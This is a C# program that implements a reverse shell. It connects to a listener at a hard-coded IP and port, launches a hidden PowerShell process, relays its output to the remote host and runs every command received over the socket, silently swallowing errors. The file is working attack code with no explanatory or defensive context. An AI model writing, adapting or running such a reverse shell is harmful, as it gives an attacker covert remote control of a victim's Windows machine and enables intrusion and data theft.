using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.IO;
using System.Threading.Tasks;

namespace Sigma
{
    class Program
    {
        static void Main(string[] args)
        {
            string remoteHost = "192.168.42.140";  // Listener IP
            int remotePort = 8080;                 // Listener Port

            try
            {
                using (TcpClient client = new TcpClient(remoteHost, remotePort))
                using (NetworkStream stream = client.GetStream())
                {
                    // Start a clean PowerShell process (non-interactive)
                    Process process = new Process();
                    process.StartInfo.FileName = "powershell.exe";
                    process.StartInfo.Arguments = "-NoLogo -NoProfile -Command -";
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardInput = true;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.RedirectStandardError = true;
                    process.Start();

                    // Send stdout to socket
                    Task.Run(() =>
                    {
                        byte[] buffer = new byte[1024];
                        int bytesRead;
                        while ((bytesRead = process.StandardOutput.BaseStream.Read(buffer, 0, buffer.Length)) > 0)
                        {
                            stream.Write(buffer, 0, bytesRead);
                            stream.Flush();
                        }
                    });

                    // Send stderr to socket
                    Task.Run(() =>
                    {
                        byte[] buffer = new byte[1024];
                        int bytesRead;
                        while ((bytesRead = process.StandardError.BaseStream.Read(buffer, 0, buffer.Length)) > 0)
                        {
                            stream.Write(buffer, 0, bytesRead);
                            stream.Flush();
                        }
                    });

                    // Read commands from socket and send to stdin
                    using (StreamReader netReader = new StreamReader(stream))
                    using (StreamWriter psInput = process.StandardInput)
                    {
                        while (true)
                        {
                            string command = netReader.ReadLine();
                            if (command == null)
                                break;

                            psInput.WriteLine(command);
                            psInput.Flush();
                        }
                    }

                    process.WaitForExit();
                }
            }
            catch (Exception ex)
            {
                // Optional: log errors or debug here
            }
        }
    }
}
